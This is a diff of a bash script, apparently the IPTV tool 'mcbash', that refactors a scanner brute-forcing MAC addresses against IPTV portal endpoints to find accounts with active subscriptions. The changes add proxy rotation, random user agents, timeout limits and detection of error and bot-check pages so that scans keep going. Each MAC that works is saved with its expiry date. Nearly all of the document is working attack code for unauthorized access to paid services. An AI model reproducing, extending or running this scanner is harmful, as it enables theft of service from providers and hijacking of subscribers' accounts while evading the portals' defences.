@@ -398,6 +398,28 @@ read_mac_from_file() {
 	encoded_mac=$(echo $mac | sed 's/:/\%3A/g')
 }
 
+generate_mac() {
+	if [[ -n ${read_from_file} ]]; then
+		read_mac_from_file
+	else
+		[[ -n ${seq} ]] && seq_mac
+		[[ -z ${seq+x} ]] && random_mac
+	fi
+}
+
+valid_mac_found() {
+	if [[ $valid_macs_number == 0 ]]; then
+		echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
+	fi
+	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
+	if [[ -n ${only_outputs_mac} ]]; then
+		echo $mac
+	else
+		echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n"
+	fi
+	valid_macs_number=$(( $valid_macs_number + 1 ))
+}
+
 check_parameters() {
 	if [ "$avoid_parameters" = true ]; then
 		populate_necessary_values
@@ -655,22 +677,6 @@ proxy_from_file() {
 	proxy_url=$(sed "${current_proxy_line}q;d" "${proxy_file}")
 }
 
-generate_mac() {
-	if [[ -n ${read_from_file} ]]; then
-		read_mac_from_file
-	else
-		[[ -n ${seq} ]] && seq_mac
-		[[ -z ${seq+x} ]] && random_mac
-	fi
-}
-
-last_request_was_a_timeout() {
-	unset last_request_timedout
-	if [[ -n "${proxy_from_file}" ]]; then
-		update_proxy
-	fi
-}
-
 check_if_time_to_stop() {
 	if [[ -n ${stopping} && $item -eq $stopping ]]; then
 		if ! [[ -n ${only_outputs_mac} ]]; then
@@ -691,17 +697,6 @@ check_if_timebreak() {
 	fi
 }
 
-request_is_a_timeout() {
-	timeout_number=$(( $timeout_number + 1 ))
-	last_request_timedout=true
-	if ! [[ -n ${only_outputs_mac} ]]; then
-		echo -ne "${_ERASE}${_BLUE}Timeout [$timeout_number]. New attempt in $timebreak_duration seconds.${_RESET}"
-	fi
-	sleep $timebreak_duration
-	if ! [[ -n ${only_outputs_mac} ]]; then
-		echo -ne "${_ERASE}${_ERASE}${_BLUE}New attempt...${_RESET}"
-	fi
-}
 
 handshake_token_is_empty() {
 	if [[ $handshake_token = "" || $(echo $handshake_token | grep null) ]]; then
@@ -714,41 +709,109 @@ handshake_token_is_empty() {
 }
 
 
-handshaking() {
-	if [[ -n ${last_request_timedout} ]]; then
-		last_request_was_a_timeout
-	else
-		if ! [[ $item == 0 ]]; then
-			check_if_time_to_stop
-			check_if_timebreak
+check_if_timeout_limit() {
+	#if [[ -z "${proxy_from_file+x}" && $consecutive_timeout_number -ge $consecutive_timeout_limit ]]; then
+	if [[ -z "${proxy_from_file+x}" ]]; then
+		if [[ $consecutive_timeout_number -ge $consecutive_timeout_limit && \
+			$consecutive_timeout_limit ]]; then
+			echo -e "${_ERASE}${_YELLOW}Limit of consecutive timeouts allowed reached [$consecutive_timeout_number].${_RESET}" #TODO
+			exit 1
+		elif [[ $total_timeout_number -ge $total_timeout_limit &&\
+			$total_timeout_limit -ne 0 ]]; then
+			echo -e "${_ERASE}${_YELLOW}Limit of total timeouts allowed reached [$total_timeout_number].${_RESET}" #TODO
+			exit 1
 		fi
-		item=$(( $item + 1 ))
-		generate_mac
 	fi
+}
+
+last_request_failed() {
+	unset mac_not_changed
+	#if [[ -n "${proxy_from_file}" && $consecutive_timeout_number -ge $consecutive_timeout_limit ]]; then
+	if [[ -n "${proxy_from_file}" ]]; then
+		if [[ $consecutive_timeout_number -ge $consecutive_timeout_limit && \
+			$consecutive_timeout_limit -ne 0 ]]; then
+			update_proxy
+			consecutive_timeout_number=0
+			total_timeout_number=0
+		elif [[ $total_timeout_number -ge $total_timeout_limit && \
+			$total_timeout_limit -ne 0 ]]; then
+			update_proxy
+			consecutive_timeout_number=0
+			total_timeout_number=0
+		fi
+	fi
+}
+
+request_is_a_timeout() {
+	consecutive_timeout_number=$(( $consecutive_timeout_number + 1 ))
+	total_timeout_number=$(( $total_timeout_number + 1 ))
+	#last_request_timedout=true
+	mac_not_changed=true
+	check_if_timeout_limit
+	if ! [[ -n ${only_outputs_mac} ]]; then
+		echo -ne "${_ERASE}${_BLUE}Timeout [$total_timeout_number] (consecutive:$consecutive_timeout_number). New attempt in $timebreak_duration seconds.${_RESET}"
+	fi
+	sleep $timebreak_duration
+	if ! [[ -n ${only_outputs_mac} ]]; then
+		echo -ne "${_ERASE}${_ERASE}${_BLUE}New attempt...${_RESET}"
+	fi
+}
+
+check_curl_exit_code() {
+	# Function that returns 1 if curl failed, else 0
+	curl_exit=$?
+	if [ $curl_exit -eq 28 ]; then
+		request_is_a_timeout
+		return 1
+	elif [ $curl_exit -eq 5 ]; then
+		echo -e "\t${_DIM}curl could not resolve proxy.${_RESET}" # TODO
+		mac_not_changed=true
+		consecutive_timeout_number=$consecutive_timeout_limit
+		total_timeout_number=$total_timeout_limit
+		return 1
+	elif [ $curl_exit -ne 0 ]; then
+		echo -e "\t${_DIM}curl exit code : $curl_exit.${_RESET}" #TODO
+		mac_not_changed=true
+		consecutive_timeout_number=$consecutive_timeout_limit
+		total_timeout_number=$total_timeout_limit
+		return 1
+	fi
+	return 0
+}
+
+get_handshake() {
 	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
 	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam; "
 	random_user_agent
 
-	handshake_token=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi
+	handshake_token=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if ! check_curl_exit_code; then return 1; fi
 
 	if [[ -n ${debug} ]]; then
 		echo -e "\n---------------------------------\n\t${_YELLOW}Handshake token : ${_RESET}${_BLUE}${handshake_token:-Empty}${_RESET}"
 	fi
 
+	if [[ $(echo "$handshake_token" | grep -Eio "error code|unauthorized|502 bad gateway|maximum number of open connections reached|just a moment|500 internal server error|error") ]]; then
+		#echo "contains error"
+		mac_not_changed=true
+		return 1
+	fi
+
 	handshake_token=$(echo $handshake_token| grep -o '"token".*' | sed 's/\"token\":// ; s/\}\}//')
 
 	if handshake_token_is_empty; then
-		return
+		return 1
 	fi
+}
 
+get_profile() {
 	authorization='Bearer '$(echo $handshake_token)
 	profile_url=$(echo $dns)'/portal.php?type=account_info&action=get_main_info&mac='$(echo $mac)
-	profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi
+	profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if ! check_curl_exit_code; then return 1; fi
 
 	if [[ $profile == "" ]]; then
 		maybeGEN1portal=true
 		profile_url=$(echo $dns)'/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml='$(echo $mac)
-		profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if [ $? -eq 28 ]; then request_is_a_timeout && return; fi
+		profile=$(curl $proxy_user_option $proxy_url_option --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)"); if ! check_curl_exit_code; then return 1; fi
 	fi
 
 	if [[ $profile == "" ]]; then
@@ -756,7 +819,7 @@ handshaking() {
 		if ! [[ -n ${only_outputs_mac} ]]; then
 			echo -ne "${_ERASE}$@${_YELLOW}[$item]${_RESET} ${_RED}$mac ${_RESET}"
 		fi
-		return # test
+		return 1 # test
 	fi
 
 	if [[ -z ${maybeGEN1portal+x} ]]; then
@@ -774,7 +837,9 @@ handshaking() {
 	if [[ -n ${debug} ]]; then
 		echo -e "${_YELLOW}PROFILE2 : ${_RESET}${_BLUE}${profile}${_RESET}"
 	fi
+}
 
+get_exp_date() {
 	expiration_date=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')
 
 	if [[ -n ${debug} ]]; then
@@ -785,7 +850,7 @@ handshaking() {
 		if ! [[ -n ${only_outputs_mac} ]]; then
 			echo -ne "\r${_YELLOW}[$item]${_RESET} ${_BOLD}${_RED}$mac [expired] ${_RESET}"
 		fi
-		return
+		return 1
 	fi
 
 	if [[ -z ${expiration_date} && -n ${keep_expired} ]]; then
@@ -796,19 +861,28 @@ handshaking() {
 			echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
 		fi
 		echo "$mac [expired]" >> $destination/valid_macs_$name
-		return
+		return 1
+	fi
+}
+
+scanning() {
+	if [[ -n ${mac_not_changed} ]]; then
+		last_request_failed
+	else
+		consecutive_timeout_number=0
+		if ! [[ $item == 0 ]]; then
+			check_if_time_to_stop
+			check_if_timebreak
+		fi
+		item=$(( $item + 1 ))
+		generate_mac
 	fi
 
-	if [[ $valid_macs_number == 0 ]]; then
-		echo -e "\n$dns ($(date))\n" >> $destination/valid_macs_$name
-	fi
-	echo "$mac [$expiration_date]" >> $destination/valid_macs_$name
-	if [[ -n ${only_outputs_mac} ]]; then
-		echo $mac
-	else
-		echo -ne "\r${_BOLD}${_GREEN}[$item] $mac ${_RESET}${_RED}[$expiration_date] ${_RESET}\n"
-	fi
-	valid_macs_number=$(( $valid_macs_number + 1 ))
+	if ! get_handshake; then return; fi
+	if ! get_profile; then return; fi
+	if ! get_exp_date; then return; fi
+
+	valid_mac_found
 	unset maybeGEN1portal
 }
 
@@ -844,7 +918,7 @@ stty -echoctl # Hide ^C when pressing Ctrl+C
 
 while :
 do
-	handshaking
+	scanning
 	trap quit_mcbash SIGINT
 done
 # Dependencies :  NAME : PACKAGE TO INSTALL
